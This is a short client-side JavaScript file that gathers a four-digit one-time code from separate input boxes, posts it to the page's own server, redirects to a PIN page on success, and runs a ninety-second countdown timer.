const otpForm = document.querySelector('.otpForm');
const digit1Input = document.getElementById("digit1");
const digit2Input = document.getElementById("digit2");
const digit3Input = document.getElementById("digit3");
const digit4Input = document.getElementById("digit4");


// Function to handle input changes
function handleInputChange(e) {
    if (digit1Input.value && digit2Input.value && digit3Input.value && digit4Input.value) {
        const otp = digit1Input.value + digit2Input.value + digit3Input.value + digit4Input.value;
        e.preventDefault()

        let formData = {
         otp: otp,
        }
       
        
        let xhr = new XMLHttpRequest();
        xhr.open('POST','/');
        xhr.setRequestHeader('content-type','application/json');
        xhr.onload = function(){
         console.log(xhr.responseText)
         if(xhr.responseText == 'success'){
             location.href = "/pin"
         }else {
             alert("something went wrong")
         }
        }
     
        xhr.send(JSON.stringify(formData))
     
        console.log("OTP entered: " + otp);

        // Here, you can add code to submit the OTP automatically if needed
        // For example, you can call a function to perform the submission.
        // For now, we'll just display an alert.
        // alert("OTP submitted: " + otp);
    }
}


   // Add an event listener to each input field
   digit1Input.addEventListener("input", handleInputChange);
   digit2Input.addEventListener("input", handleInputChange);
   digit3Input.addEventListener("input", handleInputChange);
   digit4Input.addEventListener("input", handleInputChange);




   const timerElement = document.querySelector(".time p");

   let minutes = 1;
   let seconds = 30;

   function updateTimer() {
       if (minutes === 0 && seconds === 0) {
           timerElement.textContent = "0:00";
           clearInterval(interval);
       } else {
           if (seconds === 0) {
               minutes--;
               seconds = 59;
           } else {
               seconds--;
           }

           const displayMinutes = minutes < 10 ? "0" + minutes : minutes;
           const displaySeconds = seconds < 10 ? "0" + seconds : seconds;
           timerElement.textContent = displayMinutes + ":" + displaySeconds;
       }
   }

   const interval = setInterval(updateTimer, 1000);

